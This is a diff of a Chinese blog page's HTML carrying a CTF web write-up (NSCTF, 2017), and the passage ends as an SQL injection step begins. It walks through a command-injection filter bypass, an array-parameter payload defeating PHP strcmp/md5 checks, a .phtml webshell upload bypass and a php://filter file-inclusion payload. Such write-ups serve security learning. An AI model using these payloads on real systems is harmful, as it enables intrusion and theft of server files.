@@ -1,548 +1,290 @@
 <!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="T3stzer0">
+
+
+    <meta name="subtitle" content="思考">
 
 
 
 
+<title>NSCTF-Web-WriteUp | T3stzer0&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
 
 
 
 
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
 
 
 
-
-  
-
-
-<html class="theme-next muse use-motion" lang="zh-CN">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
-<meta name="theme-color" content="#222"/>
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
 
 
 
-
-
-
-
-
-
-
-  <meta name="google-site-verification" content="googlea4e6eb27cf4f8663.html"/>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
-
-<link rel="stylesheet" href="/css/main.css?v=7.0.1"/>
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar.jpg?v=7.0.1">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar.jpg?v=7.0.1">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    version: '7.0.1',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
 </script>
 
 
-  
+    
 
-
-
-
-  <meta name="keywords" content="CTF,WriteUp">
-<meta property="og:type" content="article">
-<meta property="og:title" content="NSCTF-Web-WriteUp">
-<meta property="og:url" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/index.html">
-<meta property="og:site_name" content="Wz&#39;s Blog">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-39-21.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-22-22.png">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-22-29.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-22-36.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-22-43.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-23-00.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-23-06.png">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-24-01.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-24-42.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-24-47.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-24-53.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-24-57.png">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-25-03.png">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-25-09.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-25-13.png">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-25-45.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-26-31.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-26-42.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-27-13.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-28-52.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-28-58.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-29-10.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-29-43.png">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-29-53.png">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-30-25.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-30-29.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-32-02.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-32-09.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-32-16.jpg">
-<meta property="og:updated_time" content="2019-01-22T04:54:02.133Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="NSCTF-Web-WriteUp">
-<meta name="twitter:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-39-21.jpg">
-
-
-
-
-
-  
-  
-  <link rel="canonical" href="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/"/>
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>NSCTF-Web-WriteUp | Wz's Blog</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
 
 </head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
-
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Wz's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-      
-        <p class="site-subtitle">安全菜鸡的挖坑填坑之旅</p>
-      
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>归档</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-categories">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br/>分类</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>关于</a>
-
-  </li>
-
-      
-      
-    </ul>
-  
-
-  
-    
-
-  
-
-  
-</nav>
-
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-  
-  
-
-  
-
-  <a href="https://github.com/testzero-wz" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
-
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/"/>
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="W z"/>
-      <meta itemprop="description" content=""/>
-      <meta itemprop="image" content="/images/avatar.gif"/>
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Wz's Blog"/>
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">NSCTF-Web-WriteUp
-
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Home</a></div>
+            <div class="menu navbar-right">
                 
-              
-
-              <time title="创建时间：2017-09-27 16:20:00" itemprop="dateCreated datePublished" datetime="2017-09-27T16:20:00+08:00">2017-09-27</time>
-            
-
-            
-              
-
-              
+                    <a class="menu-item" href="/archives">Posts</a>
                 
-                <span class="post-meta-divider">|</span>
+                    <a class="menu-item" href="/category">Categories</a>
                 
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
+                    <a class="menu-item" href="/tag">Tags</a>
                 
-                  <span class="post-meta-item-text">更新于</span>
+                    <a class="menu-item" href="/about">About</a>
                 
-                <time title="修改时间：2019-01-22 12:54:02" itemprop="dateModified" datetime="2019-01-22T12:54:02+08:00">2019-01-22</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/安全之旅/" itemprop="url" rel="index"><span itemprop="name">安全之旅</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
         </div>
-      </header>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
     
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">NSCTF-Web-WriteUp</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">T3stzer0</a>
+                    
 
-      
-      
+                    
+                        <span class="post-time">
+                        Date: <a href="#">九月 27, 2017&nbsp;&nbsp;16:20:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/category/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
 
-      
-        <img src="/2017/09/27/NSCTF-Web-WriteUp/16-39-21.jpg" alt="16-39-21.jpg" title="">
+        <div class="post-content">
+            <p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-39-21.jpg" alt=""></p>
 <a id="more"></a>
 <h1 id="web-writeup"><a class="markdownIt-Anchor" href="#web-writeup"></a> Web-writeup</h1>
 <h2 id="1web签到题"><a class="markdownIt-Anchor" href="#1web签到题"></a> 1.Web签到题</h2>
 <p>典型签到题，点开网址是一个主办方打广告的主页，想必是跳转了。burp抓一下包就找到flag了。</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-22-22.png" alt="16-22-22.png" title="">
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-22-22.png" alt=""></p>
 <h2 id="2web2-少年你真的会使用ping吗"><a class="markdownIt-Anchor" href="#2web2-少年你真的会使用ping吗"></a> 2.Web2-少年你真的会使用PING吗？</h2>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-22-29.jpg" alt="16-22-29.jpg" title="">
-<p>进去是一个类似于shell的东西，输个百度地址也能ping通。应该是命令执行绕过。</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-22-36.jpg" alt="16-22-36.jpg" title="">
-<p>一试果然，所以直接cat%20flag_is_here.php，发现没返回，怕是过滤了，用<code>tac</code>命令试一下，成功返回flag。</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-22-43.jpg" alt="16-22-43.jpg" title="">
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-22-29.jpg" alt=""><br>
+进去是一个类似于shell的东西，输个百度地址也能ping通。应该是命令执行绕过。</p>
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-22-36.jpg" alt=""><br>
+一试果然，所以直接cat%20flag_is_here.php，发现没返回，怕是过滤了，用<code>tac</code>命令试一下，成功返回flag。</p>
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-22-43.jpg" alt=""></p>
 <h2 id="3web3"><a class="markdownIt-Anchor" href="#3web3"></a> 3.Web3</h2>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-23-00.jpg" alt="16-23-00.jpg" title="">
-<p>随便输入admin信息看一下反应</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-23-06.png" alt="16-23-06.png" title="">
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-23-00.jpg" alt=""><br>
+随便输入admin信息看一下反应</p>
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-23-06.png" alt=""></p>
 <p>多post了一个name参数<br>
 去掉name参数会出现源码，文字已经提示了代码审计。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'user'</span>]))</div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(@strcmp($_POST[<span class="string">'user'</span>],$USER))<span class="comment">//USER是被隐藏的复杂用户名</span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'user错误！'</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))</div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span> ($_POST[<span class="string">'name'</span>] == $_POST[<span class="string">'password'</span>] )</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'账号密码不能一致！'</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> (md5($_POST[<span class="string">'name'</span>]) === md5($_POST[<span class="string">'password'</span>]))</div><div class="line">	&#123;</div><div class="line">	<span class="keyword">if</span>(is_numeric($_POST[<span class="string">'id'</span>])&amp;&amp;$_POST[<span class="string">'id'</span>]!==<span class="string">'72'</span> &amp;&amp; !preg_match(<span class="string">'/\s/'</span>, $_POST[<span class="string">'id'</span>]))&#123;</div><div class="line">				<span class="keyword">if</span>($_POST[<span class="string">'id'</span>]==<span class="number">72</span>)</div><div class="line">				<span class="keyword">die</span>(<span class="string">"flag&#123;xxxxxxxxxxxxx&#125;"</span>);</div><div class="line">				<span class="keyword">else</span></div><div class="line">					<span class="keyword">die</span>(<span class="string">"ID错误2！"</span>);&#125;</div><div class="line">		<span class="keyword">else</span>&#123;<span class="keyword">die</span>(<span class="string">"ID错误1！"</span>);&#125;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'账号密码错误！'</span>);&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'user'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(@strcmp($_POST[<span class="string">'user'</span>],$USER))<span class="comment">//USER是被隐藏的复杂用户名</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'user错误！'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> ($_POST[<span class="string">'name'</span>] == $_POST[<span class="string">'password'</span>] )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'账号密码不能一致！'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (md5($_POST[<span class="string">'name'</span>]) === md5($_POST[<span class="string">'password'</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">if</span>(is_numeric($_POST[<span class="string">'id'</span>])&amp;&amp;$_POST[<span class="string">'id'</span>]!==<span class="string">'72'</span> &amp;&amp; !preg_match(<span class="string">'/\s/'</span>, $_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">				<span class="keyword">if</span>($_POST[<span class="string">'id'</span>]==<span class="number">72</span>)</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">"flag&#123;xxxxxxxxxxxxx&#125;"</span>);</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					<span class="keyword">die</span>(<span class="string">"ID错误2！"</span>);&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;<span class="keyword">die</span>(<span class="string">"ID错误1！"</span>);&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'账号密码错误！'</span>);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>根据代码分析，最后POST的参数是<code>user[]=&amp;password[]=&amp;id=072&amp;login=Check&amp;name[]=1</code><br>
 就能绕过了</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-01.jpg" alt="16-24-01.jpg" title="">
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-01.jpg" alt=""></p>
 <h2 id="3web4文件上传"><a class="markdownIt-Anchor" href="#3web4文件上传"></a> 3.Web4文件上传</h2>
 <p>不多说，一个文件上传绕过，甚至还有tips<br>
 直接找个php一句话木马传上去，看看过滤了什么</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-42.jpg" alt="16-24-42.jpg" title="">
-<p>经过试验，后缀名过滤了php，文件内容过滤了&lt;?php等关键字。<br>
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-42.jpg" alt=""><br>
+经过试验，后缀名过滤了php，文件内容过滤了&lt;?php等关键字。<br>
 后缀名可以用.phtml绕过，内容使用<code>&lt;script language=”php”&gt;code&lt;/script&gt;</code>绕过<br>
 上传成功后访问你上传的木马就会得到flag</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-47.jpg" alt="16-24-47.jpg" title="">
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-47.jpg" alt=""></p>
 <h2 id="5web6-vulhub"><a class="markdownIt-Anchor" href="#5web6-vulhub"></a> 5.Web6-Vulhub</h2>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-53.jpg" alt="16-24-53.jpg" title="">
-<p>题目一开始给的范围有点大，一开始看到留言，以为XSS，看到提示<code>url_include_open=on</code>，以为文件包含，通过about页面的参数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?f=php://filter/read=convert.base64-encode/resource=xxx.php</div></pre></td></tr></table></figure>
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-53.jpg" alt=""><br>
+题目一开始给的范围有点大，一开始看到留言，以为XSS，看到提示<code>url_include_open=on</code>，以为文件包含，通过about页面的参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=php://filter/read=convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></figure>
 <p>就会得到base64编码后的xxx.php的源码。</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-57.png" alt="16-24-57.png" title="">
-<p>解码后</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-25-03.png" alt="16-25-03.png" title="">
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-57.png" alt=""><br>
+解码后</p>
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-25-03.png" alt=""></p>
 <p>发现一个flag.php，解码后提示flag在数据库中。。。又是一个坑</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-25-09.jpg" alt="16-25-09.jpg" title="">
+<p><img src="/2017/09/27/NSCTF-Web-WriteUp/16-25-09.jpg" alt=""></p>
 <p>随找注入点。<br>
 留言的地方发留言用burp截断之后，response返回的是一串sql语句+username。</p>
